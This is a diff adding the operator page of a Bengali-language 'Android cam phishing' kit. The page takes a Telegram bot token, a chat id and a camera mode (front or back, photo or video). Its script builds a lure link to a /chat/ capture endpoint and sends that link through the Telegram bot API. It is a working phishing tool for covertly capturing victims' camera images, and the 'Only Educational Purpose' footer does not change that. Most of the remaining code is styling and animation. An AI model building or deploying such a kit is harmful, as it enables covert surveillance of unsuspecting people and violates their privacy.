@@ -1,0 +1,477 @@
+<!doctype html>
+<html lang="bn">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>ANDROID CAM PHISH</title>
+<link href="https://fonts.googleapis.com/css2?family=Rubik:wght@300;400;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg: #040201;
+    --gray: #9E9E9E;
+    --neon-2: #ff6b6b;
+    --glow: rgba(255,31,31,0.18);
+    --cyan: #00BCD4;
+    --avatar-size: 220px;
+    --input-h: 48px;            /* reduced height as requested */
+    --big-radius: 36px;
+    --card-radius: 12px;
+    --border-w: 2px;
+  }
+
+  *{box-sizing:border-box}
+  html,body{height:100%;margin:0;font-family:Rubik,system-ui,Arial,sans-serif;background:#000; color: #FFFFFF;}
+
+  /* full-screen rain canvas */
+  canvas#rainCanvas{
+    position:fixed;
+    left:0;
+    top:0;
+    width:100%;
+    height:100%;
+    z-index:0;
+    pointer-events:none; /* allow clicks through canvas */
+    mix-blend-mode:screen; /* subtle blend */
+    opacity:0.55;
+  }
+
+  /* content container sits above canvas */
+  .page-wrap{ position:relative; z-index:2; display:flex; justify-content:center; align-items:flex-start; padding:28px; min-height:100vh; }
+
+.page{
+  width:100%;
+  max-width:920px;
+  margin-top:18px;
+  opacity:1;               /* শুরুতেই পুরো দেখা যাবে */
+  transform: translateY(0); /* কোনো নিচ থেকে আসার ইফেক্ট নেই */
+  transition:none;         /* পুরো transition বন্ধ */
+}
+
+  .page.show{ opacity:1; transform: translateY(0); }
+
+  .card{
+    ;
+    border-radius:var(--card-radius);
+    padding:22px;
+    border:var(--border-w) solid rgba(255,0,0,0.12);
+    box-shadow:0 20px 90px var(--glow), inset 0 -8px 40px rgba(0,0,0,0.36);
+    position:relative;
+    overflow:visible;
+    backdrop-filter: blur(6px);
+  }
+
+  .top{ display:flex; flex-direction:column; align-items:center; text-align:center; padding-bottom:8px; }
+  .avatar{
+    width:var(--avatar-size);
+    height:var(--avatar-size);
+    border-radius:50%;
+    background-size:cover;
+    background-position:center;
+    border:var(--border-w) solid rgba(255,0,0,0.95);
+    box-shadow:
+      0 0 20px rgba(255,0,0,0.95),
+      0 0 48px rgba(255,0,0,0.66),
+      0 0 120px rgba(255,0,0,0.36);
+    margin-bottom:14px;
+    transition: transform .34s cubic-bezier(.2,.9,.2,1), box-shadow .28s;
+  }
+
+  h1{ font-size:48px; 
+margin:6px 0; 
+color:var(--neon);
+ letter-spacing:2px;
+ text-shadow:0px 0px 30px red ;
+ line-height:1; }
+
+  .name-link{
+ color:var(--green);
+ font-weight:900;
+ text-decoration:none; 
+ padding:4px 8px;
+ border-radius:6px; 
+ background:rgba(51,209,122,0.02) }
+
+  .form{ margin-top:16px; display:flex; flex-direction:column; gap:12px; position:relative; }
+
+  /* wider inputs (use full width) and reduced height */
+  .input{
+    width:100%;
+    height:var(--input-h);
+    padding:10px 20px;
+    font-size:16px;
+    color:var(--neon);
+    background: linear-gradient(90deg, rgba(0,0,0,0.55), rgba(0,0,0,0.35));
+    border-radius:var(--big-radius);
+    border: var(--border-w) solid rgba(255,0,0,0.9);
+    outline:none;
+    box-shadow: inset 0 6px 22px rgba(0,0,0,0.6);
+    transition: box-shadow .18s, transform .12s;
+    font-weight:800;
+  }
+  .input::placeholder{ color:#ff8b8b; opacity:0.95; font-weight:700; font-size:15px; }
+
+  .input:focus{ box-shadow: 0 20px 60px rgba(255,0,0,0.12), inset 0 8px 20px rgba(0,0,0,0.6); transform: translateY(-2px); }
+
+  /* hidden original select kept for JS compatibility */
+  select#modeSelect{ position:absolute; left:-9999px; width:1px; height:1px; opacity:0; pointer-events:none; }
+
+  /* custom dropdown styles */
+  .select-wrap{ position:relative; width:100%; }
+  .custom-dropdown{
+    width:100%;
+    border-radius:36px;
+    height:50px;
+    background:rgba(0,0,0,0.45);
+    border:2px solid rgba(255,0,0,0.9);
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:10px 16px;
+    cursor:pointer;
+    font-weight:900;
+    font-size:16px;
+    color:var(--neon);
+    box-shadow:0 8px 30px rgba(0,0,0,0.6), 0 0 20px rgba(255,0,0,0.06);
+    transition: box-shadow .18s ease, transform .12s ease;
+    user-select:none;
+  }
+  .custom-dropdown .caret{ transition: transform .28s cubic-bezier(.2,.9,.2,1); font-size:18px; color:var(--neon); }
+
+  .panel{ position:absolute; left:0; right:0; top:62px; background:rgba(0,0,0,0.92); border-radius:14px; border:2px solid rgba(255,0,0,0.88); overflow:hidden; transform-origin:top center; box-shadow:0 30px 90px rgba(255,0,0,0.12); max-height:0; opacity:0; pointer-events:none; transform: translateY(8px) scale(0.98); transition: max-height .38s cubic-bezier(.2,.9,.2,1), opacity .26s ease, transform .34s cubic-bezier(.2,.9,.2,1); z-index:50; }
+  .panel.open{ max-height:220px; opacity:1; pointer-events:auto; transform: translateY(0) scale(1); }
+  .panel .item{ padding:12px 16px; font-weight:900; color:var(--neon); cursor:pointer; transition: background .12s, padding-left .12s; font-size:15px; }
+  .panel .item:hover{ background: rgba(255,0,0,0.12); padding-left:22px; }
+
+  .send-wrap{ display:flex; justify-content:center; margin-top:8px; }
+  .btn{ padding:12px 36px; font-size:18px; font-weight:900; border-radius:28px; border:var(--border-w) solid rgba(255,0,0,0.22); background:linear-gradient(90deg,#ff2e2e,#ff7b7b); color:#111; cursor:pointer; box-shadow:0 22px 60px rgba(255,0,0,0.14); transition: transform .12s, box-shadow .12s, filter .12s; }
+  .btn:hover{ transform: translateY(-4px) scale(1.02); box-shadow: 0 28px 90px rgba(255,0,0,0.26); filter: drop-shadow(0 0 18px rgba(255,0,0,0.45)); }
+
+  .msg{ margin-top:14px; padding:10px 14px; border-radius:6px; font-weight:800; display:none; text-align:center; border:2px solid transparent; font-size:14px; }
+  .msg.success{ background: linear-gradient(90deg, rgba(51,209,122,0.06), rgba(0,0,0,0.02)); color:var(--green); border-color: rgba(51,209,122,0.12) }
+  .msg.fail{ background: linear-gradient(90deg, rgba(255,77,77,0.04), rgba(0,0,0,0.02)); color:#ff6b6b; border-color: rgba(255,77,77,0.12); }
+
+  .footer-note{ margin-top:12px; color:#ff9b9b; text-align:center; font-size:13px }
+
+  /* avatar float animation */
+  @keyframes bob {
+    0% { transform: translateY(0) rotate(-0.2deg) }
+    50% { transform: translateY(-8px) rotate(0.4deg) }
+    100% { transform: translateY(0) rotate(-0.2deg) }
+  }
+  .avatar.float{ animation: bob 3.6s ease-in-out infinite; will-change: transform; }
+  .avatar.pulse{ animation: bob 1.6s ease-in-out 1; }
+
+  @media (prefers-reduced-motion: reduce){
+    .avatar.float{ animation:none }
+    .page, .panel, .custom-dropdown, .btn { transition: none; }
+  }
+
+  @media (max-width:900px){
+    :root{ --avatar-size:180px; }
+    h1{ font-size:36px; }
+    .input{ height:44px; font-size:15px; }
+    .custom-dropdown{ height:48px; font-size:15px; padding:10px 14px; }
+    .panel{ top:58px; }
+  }
+</style>
+</head>
+<body>
+  <!-- rain canvas -->
+  <canvas id="rainCanvas" aria-hidden="true"></canvas>
+
+  <div class="page-wrap">
+    <div class="page" id="pageRoot">
+      <div class="card">
+        <div class="top">
+          <div id="avatar" class="avatar" style="background-image: url('DATA:IMAGE/JPEG;BASE64,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');" title="Double-click to change"></div>
+          <h1>𝐀𝐧𝐝𝐫𝐨𝐢𝐝 𝐜𝐚𝐦 𝐏𝐡𝐢𝐬𝐡𝐢𝐧𝐠</h1>
+          <div class="by"><span class="name-span"><a class="name-link" href="#" id="authorLink">ʙʏ 𝑴𝑹𝑿 ☂️⁴⁵</a></span></div>
+        </div>
+
+        <form id="mainForm" class="form" onsubmit="return false;">
+          <input id="token" class="input" type="text" placeholder="Enter bot token" autocomplete="off" aria-label="Bot token" />
+          <input id="chatid" class="input" type="text" placeholder="Enter Chat id" aria-label="Chat id" />
+
+          <div class="select-wrap" id="selectWrap">
+            <!-- hidden original select (kept for original JS) -->
+            <select id="modeSelect" class="select" aria-label="Select capture option">
+              <option value="front-photo">Front — Photo (default)</option>
+              <option value="front-video">Front — Video</option>
+              <option value="back-photo">Back — Photo</option>
+              <option value="back-video">Back — Video</option>
+            </select>
+
+            <!-- visible custom dropdown -->
+            <div id="customDropdown" class="custom-dropdown" role="button" tabindex="0" aria-haspopup="listbox" aria-expanded="false">
+              <span id="customLabel">Front — Photo</span>
+              <span class="caret" id="customCaret">▾</span>
+            </div>
+
+            <div id="panel" class="panel" role="listbox" aria-labelledby="customLabel">
+              <div class="item" data-value="front-photo" role="option">Front — Photo</div>
+              <div class="item" data-value="front-video" role="option">Front — Video</div>
+              <div class="item" data-value="back-photo" role="option">Back — Photo</div>
+              <div class="item" data-value="back-video" role="option">Back — Video</div>
+            </div>
+          </div>
+
+          <div class="send-wrap">
+            <button id="sendBtn" class="btn" type="button">Send</button>
+          </div>
+
+          <div id="success" class="msg success" role="status" aria-hidden="true">✅ সফলভাবে লিংক পাঠানো হয়েছে।</div>
+          <div id="fail" class="msg fail" role="status" aria-hidden="true">❌ লিংক পাঠানো ব্যর্থ — Token/Chat ID যাচাই করো।</div>
+
+          <div class="footer-note">𝙾𝚗𝚕𝚢 𝙴𝚍𝚞𝚌𝚊𝚝𝚒𝚘𝚗𝚊𝚕 𝙿𝚘𝚞𝚛𝚙𝚘𝚜𝚎.</div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+<!-- ===========================
+     ORIGINAL JS (unchanged)
+     =========================== -->
+<script>
+(function(){
+  const avatarEl = document.getElementById('avatar');
+  const tokenEl = document.getElementById('token');
+  const chatEl = document.getElementById('chatid');
+  const modeSelect = document.getElementById('modeSelect');
+  const sendBtn = document.getElementById('sendBtn');
+  const success = document.getElementById('success');
+  const fail = document.getElementById('fail');
+
+  function hideMsgs(){
+    success.style.display = 'none';
+    success.setAttribute('aria-hidden','true');
+    fail.style.display = 'none';
+    fail.setAttribute('aria-hidden','true');
+  }
+  hideMsgs();
+
+  modeSelect.addEventListener('change', ()=> {
+    modeSelect.style.background = 'linear-gradient(90deg,#ff4b4b,#ff8a8a)';
+    modeSelect.style.color = '#111';
+    modeSelect.style.borderColor = 'rgba(255,60,60,0.95)';
+    hideMsgs();
+  });
+
+  function buildLink(token, chatId, mode){
+    const base = location.origin.replace(/\/$/,'');
+    const t = encodeURIComponent(token.trim());
+    const id = encodeURIComponent(chatId.trim());
+    let url = `${base}/chat/?token=${t}&id=${id}&mode=${encodeURIComponent(mode)}`;
+    if(mode && mode.includes('video')) url += '&duration=5';
+    return url;
+  }
+
+  async function sendToTelegram(token, chatId, text){
+    const api = `https://api.telegram.org/bot${token}/sendMessage`;
+    try{
+      const res = await fetch(api, {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ chat_id: chatId, text: text, disable_web_page_preview: false })
+      });
+      return res.json();
+    }catch(e){
+      return { ok:false, error: (e && e.message) || String(e) };
+    }
+  }
+
+  function validate(){
+    const t = tokenEl.value.trim(), c = chatEl.value.trim();
+    if(!t || !c) return false;
+    if(!t.includes(':') || t.length < 20) return false;
+    return true;
+  }
+
+  sendBtn.addEventListener('click', async ()=>{
+    hideMsgs();
+    if(!validate()){
+      fail.textContent = '❌ লিংক পাঠানো ব্যর্থ — Token/Chat ID সঠিক নয়।';
+      fail.style.display = 'block';
+      fail.setAttribute('aria-hidden','false');
+      return;
+    }
+
+    sendBtn.disabled = true;
+    const oldTxt = sendBtn.textContent;
+    sendBtn.textContent = 'Sending...';
+
+    const token = tokenEl.value.trim();
+    const chatId = chatEl.value.trim();
+    const mode = modeSelect.value || 'front-photo';
+    const link = buildLink(token, chatId, mode);
+
+    const res = await sendToTelegram(token, chatId, link);
+    if(res && res.ok){
+      success.style.display = 'block';
+      success.setAttribute('aria-hidden','false');
+    } else {
+      fail.style.display = 'block';
+      fail.setAttribute('aria-hidden','false');
+      if(res && res.description) {
+        fail.textContent = '❌ ' + (res.description || 'লিংক পাঠানো ব্যর্থ');
+      }
+      console.debug('telegram response', res);
+    }
+
+    sendBtn.disabled = false;
+    sendBtn.textContent = oldTxt;
+  });
+
+  // enter key support
+  [tokenEl, chatEl].forEach(el=>{
+    el.addEventListener('keydown', (e)=>{
+      if(e.key === 'Enter'){ e.preventDefault(); sendBtn.click(); }
+    });
+  });
+
+  // optional: double-click avatar to change image URL quickly
+  avatarEl.addEventListener('dblclick', ()=>{
+    const url = prompt('নতুন avatar image URL বসাও (cancel করলে আগের থাকবে)');
+    if(url) avatarEl.style.backgroundImage = `url(${url})`;
+  });
+
+})();
+</script>
+
+<!-- ===========================
+     NEW: rain animation + UI helpers + dropdown sync
+     (this does NOT modify original JS logic)
+     =========================== -->
+<script>
+/* ---------- MATRIX-LIKE RAIN (canvas) ---------- */
+(function(){
+  const canvas = document.getElementById('rainCanvas');
+  const ctx = canvas.getContext('2d');
+  let width = canvas.width = window.innerWidth;
+  let height = canvas.height = window.innerHeight;
+
+  // characters set — choose subtle alphanum and some symbols for hacking vibe
+  const letters = '01<>/{}[]()*#@$%ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  const fontSize = 14; // control density
+  const columns = Math.floor(width / fontSize);
+  const drops = Array(columns).fill(0);
+
+  function resize(){
+    width = canvas.width = window.innerWidth;
+    height = canvas.height = window.innerHeight;
+    const cols = Math.floor(width / fontSize);
+    drops.length = cols;
+    for(let i=0;i<drops.length;i++){ if(!drops[i]) drops[i] = Math.random() * height; }
+  }
+  window.addEventListener('resize', resize, { passive:true });
+
+  // draw loop
+  let last = 0;
+  function draw(now){
+    // throttle a bit
+    const delta = now - last;
+    if(delta < 30){ requestAnimationFrame(draw); return; }
+    last = now;
+
+    // translucent black to slightly fade trails
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.15)';
+    ctx.fillRect(0, 0, width, height);
+
+    ctx.font = fontSize + 'px monospace';
+    for(let i=0;i<drops.length;i++){
+      const text = letters.charAt(Math.floor(Math.random() * letters.length));
+      // green-ish color with subtle neon
+      ctx.fillStyle = 'rgba(50, 255, 140, 0.85)';
+      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+      // small brighter head occasionally
+      if(Math.random() > 0.96){
+        ctx.fillStyle = 'rgba(200,255,200,0.98)';
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize - fontSize);
+      }
+
+      // move drop
+      if(drops[i] * fontSize > height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+
+    requestAnimationFrame(draw);
+  }
+
+  // Respect reduced-motion preference
+  const prefersReduce = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+  if(!prefersReduce){
+    resize();
+    requestAnimationFrame(draw);
+  } else {
+    // if reduced motion, make canvas subtle static overlay (no animation)
+    ctx.fillStyle = 'rgba(0,0,0,0.6)';
+    ctx.fillRect(0,0,width,height);
+  }
+})();
+
+/* ---------- UI entrance + avatar float + dropdown sync ---------- */
+(function(){
+  const page = document.getElementById('pageRoot');
+  const avatar = document.getElementById('avatar');
+
+  // page entrance
+  window.requestAnimationFrame(()=> {
+    setTimeout(()=> page.classList.add('show'), 80);
+  });
+
+  // avatar float/pulse
+  function startAvatarFloat(){
+    avatar.classList.add('float');
+    avatar.classList.add('pulse');
+    setTimeout(()=> avatar.classList.remove('pulse'), 1600);
+  }
+  setTimeout(startAvatarFloat, 420);
+
+  // custom dropdown sync (keeps original JS working)
+  const custom = document.getElementById('customDropdown');
+  const panel = document.getElementById('panel');
+  const label = document.getElementById('customLabel');
+  const caret = document.getElementById('customCaret');
+  const items = Array.from(panel.querySelectorAll('.item'));
+  const hiddenSelect = document.getElementById('modeSelect');
+
+  label.textContent = hiddenSelect.options[hiddenSelect.selectedIndex].textContent;
+
+  function openPanel(){ panel.classList.add('open'); custom.classList.add('open'); custom.setAttribute('aria-expanded','true'); caret.style.transform='rotate(180deg)'; }
+  function closePanel(){ panel.classList.remove('open'); custom.classList.remove('open'); custom.setAttribute('aria-expanded','false'); caret.style.transform='rotate(0deg)'; }
+  function togglePanel(){ if(panel.classList.contains('open')) closePanel(); else openPanel(); }
+
+  custom.addEventListener('click', (e)=> { e.stopPropagation(); togglePanel(); });
+  custom.addEventListener('keydown', (e)=> { if(e.key==='Enter'||e.key===' '){ e.preventDefault(); togglePanel(); } if(e.key==='ArrowDown'){ e.preventDefault(); openPanel(); items[0].focus(); } });
+
+  items.forEach(it=>{
+    it.setAttribute('tabindex','0');
+    it.addEventListener('click', ()=>{
+      const v = it.getAttribute('data-value');
+      const txt = it.textContent.trim();
+      hiddenSelect.value = v;
+      const ev = new Event('change', { bubbles: true });
+      hiddenSelect.dispatchEvent(ev);
+      label.textContent = txt;
+      closePanel();
+    });
+    it.addEventListener('keydown',(e)=>{
+      if(e.key==='Enter'){ e.preventDefault(); it.click(); }
+      if(e.key==='ArrowDown'){ e.preventDefault(); const next = it.nextElementSibling || items[0]; next.focus(); }
+      if(e.key==='ArrowUp'){ e.preventDefault(); const prev = it.previousElementSibling || items[items.length-1]; prev.focus(); }
+      if(e.key==='Escape'){ e.preventDefault(); closePanel(); custom.focus(); }
+    });
+  });
+
+  document.addEventListener('click',(e)=>{ if(!document.getElementById('selectWrap').contains(e.target)) closePanel(); });
+  hiddenSelect.addEventListener('change', ()=> { const idx = hiddenSelect.selectedIndex; if(idx>=0){ label.textContent = hiddenSelect.options[idx].textContent; custom.style.boxShadow='0 20px 60px rgba(255,0,0,0.18)'; setTimeout(()=> custom.style.boxShadow='',400); } });
+
+  // respect reduced-motion: disable float if user prefers
+  const prefersReduce = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+  if(prefersReduce){
+    avatar.classList.remove('float');
+  }
+})();
+</script>
+</body>
+  </html>
